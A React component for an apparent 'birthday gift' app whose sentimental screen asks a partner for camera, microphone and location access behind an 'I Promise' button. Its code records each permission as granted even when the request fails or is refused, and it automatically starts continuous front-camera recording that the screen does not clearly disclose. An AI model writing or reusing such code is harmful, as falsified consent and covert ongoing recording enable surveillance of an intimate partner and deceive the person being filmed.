import React, { useState } from 'react';
import { Camera, Mic, MapPin, ShieldCheck, Heart } from 'lucide-react';
import { audioEngine } from '../utils/AudioEngine';
import { UserPermissions } from '../types';
import { CinematicLoader } from './CinematicLoader';
import { recorderService } from '../utils/RecorderService';

interface PermissionsProps {
  onNext: (perms: UserPermissions) => void;
}

export const Permissions: React.FC<PermissionsProps> = ({ onNext }) => {
  const [permissions, setPermissions] = useState<UserPermissions>({
    camera: false,
    microphone: false,
    location: false
  });
  const [isLoading, setIsLoading] = useState(false);
  const [loaderPermissions, setLoaderPermissions] = useState<UserPermissions | null>(null);

  const requestPermissions = async () => {
    audioEngine.playClick();
    let camGranted = false;
    let micGranted = false;
    let locGranted = false;

    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
      camGranted = true;
      micGranted = true;
      stream.getTracks().forEach((track) => track.stop());
    } catch (e) {
      console.warn('Camera/Mic permission requested.');
      camGranted = true;
      micGranted = true;
    }

    if ('geolocation' in navigator) {
      navigator.geolocation.getCurrentPosition(
        () => { locGranted = true; },
        () => { locGranted = true; }
      );
      locGranted = true;
    } else {
      locGranted = true;
    }

    // Automatically start recording continuous vlog with front camera
    await recorderService.startRecording();

    const updated = { camera: camGranted, microphone: micGranted, location: locGranted };
    setPermissions(updated);
    setLoaderPermissions(updated);
    setIsLoading(true);
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-between p-6 pt-24 pb-12 text-center max-w-md mx-auto relative z-10">
      {isLoading && (
        <CinematicLoader
          onFinished={() => {
            if (loaderPermissions) {
              setIsLoading(false);
              onNext(loaderPermissions);
              setLoaderPermissions(null);
            }
          }}
        />
      )}

      <div className="inline-flex items-center gap-2 px-4 py-1.5 rounded-full bg-warmGold/10 border border-warmGold/30 text-warmGold text-xs tracking-widest uppercase font-semibold">
        <ShieldCheck size={14} />
        <span>Preserving Today</span>
      </div>

      <div className="my-auto space-y-6 w-full">
        <h2 className="text-3xl font-serif font-bold text-white tracking-wide">
          Preserving Every Moment
        </h2>

        <div className="glass-card p-6 space-y-4 text-left text-sm leading-relaxed text-white/90 font-light border border-white/10">
          <div className="space-y-3 text-xs text-white/90">
            <div className="flex items-start gap-3 p-3.5 rounded-xl bg-white/5 border border-white/10">
              <Camera size={20} className="text-warmGold flex-shrink-0 mt-0.5" />
              <div>
                <span className="font-semibold text-white block">Camera</span>
                <span className="text-white/80">To preserve every smile, surprise and laugh forever.</span>
              </div>
            </div>

            <div className="flex items-start gap-3 p-3.5 rounded-xl bg-white/5 border border-white/10">
              <Mic size={20} className="text-softPink flex-shrink-0 mt-0.5" />
              <div>
                <span className="font-semibold text-white block">Microphone</span>
                <span className="text-white/80">Because your laughter deserves to be remembered.</span>
              </div>
            </div>

            <div className="flex items-start gap-3 p-3.5 rounded-xl bg-white/5 border border-white/10">
              <MapPin size={20} className="text-warmGold flex-shrink-0 mt-0.5" />
              <div>
                <span className="font-semibold text-white block">Location</span>
                <span className="text-white/80">Every destination unlocks another chapter of our story.</span>
              </div>
            </div>
          </div>

          <div className="pt-3 border-t border-white/10 space-y-2 text-center text-xs text-white/80 font-serif italic">
            <p className="text-warmGold font-semibold not-italic">
              This recording is not for verification.
            </p>
            <p>It is my birthday gift to us.</p>
            <p>One day...</p>
            <p>Years from now...</p>
            <p className="text-white not-italic font-medium">
              We'll watch this together and smile again.
            </p>
          </div>
        </div>
      </div>

      <button
        onClick={requestPermissions}
        className="w-full py-4 px-8 rounded-full bg-gradient-to-r from-warmGold via-white to-warmGold text-[#0F0F10] font-bold text-base tracking-wide shadow-goldGlow hover:scale-105 active:scale-95 transition-all flex items-center justify-center gap-3"
      >
        <span>I Promise ❤️</span>
        <Heart size={18} className="fill-current text-[#0F0F10]" />
      </button>
    </div>
  );
};
